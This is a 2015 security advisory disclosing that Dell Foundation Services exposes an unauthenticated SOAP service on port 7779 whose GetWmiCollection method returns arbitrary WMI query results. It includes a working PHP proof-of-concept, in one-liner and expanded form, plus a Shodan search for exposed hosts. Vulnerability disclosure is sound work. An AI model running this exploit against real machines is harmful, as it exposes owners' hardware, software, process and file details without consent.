---
layout: post
title: "Security Advisory: Dell Foundation Services Remote Information Disclosure (II)"
date: 2015-11-25
categories:
---

*By slipstream/RoL.*

# Overview

Dell Foundation Services (otherwise known by its internal name of "Tribbles") "provides a core set of foundational services facilitating customer serviceability, messaging and support functions".

# Issues

Dell Foundation Services starts an HTTPd that listens on port 7779. The previous service tag leak was fixed by removing the JSONP API.

However, the webservice in question is still available; it is now a SOAP service, and all methods of that webservice can be accessed, not just the ServiceTag method.

One of the methods accessible is `List<WmiManagementItem> GetWmiCollection(string wmiQuery)` - this returns the results of a given Windows Management Instrumentation (WMI) query, enabling access to information about hardware, installed software, running processes, installed services, accessible hard disks, filesystem metadata (filenames, file size, dates) and more.

[WMI](https://msdn.microsoft.com/en-us/library/windows/desktop/aa394582(v=vs.85).aspx) is "the infrastructure for management data and operations on Windows-based operating systems".

[Many potentially vulnerable hosts can be found via Shodan](https://www.shodan.io/search?query=port%3A7779+httpapi+404&language=None) and the issue can also be exploited over a LAN.

Quick PHP one-liner proof-of-concept:

````
php -r "function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,'GetWmiCollection',array(new SoapVar($query,XSD_STRING,null,null,'wmiQuery','http://tempuri.org/'))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array('location'=>'http://'.$ip.':7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi','uri'=>'http://tempuri.org/')))->__soapCall($method,$params,array('soapaction'=>'http://tempuri.org/ISystemInfoCapabilitiesApi/'.$method)); } wmic('','');"
````

This can be expanded to:

````
<?php
function wmic($ip,$query) {
	var_dump(dowmic($ip,$query));
}

function dowmic($ip,$query) {
	return callApi($ip,'GetWmiCollection',array(new SoapVar($query,XSD_STRING,null,null,'wmiQuery','http://tempuri.org/')));
}

function callApi($ip,$method,$params = array()) {
	return (
		new SoapClient(null,array('location'=>'http://'.$ip.':7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi','uri'=>'http://tempuri.org/'))
	)->__soapCall($method,$params,array('soapaction'=>'http://tempuri.org/ISystemInfoCapabilitiesApi/'.$method));
}

wmic('','');
````

# Affected Versions

3.0.700.0.

# Solution

Uninstallation of Dell Foundation Services will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.
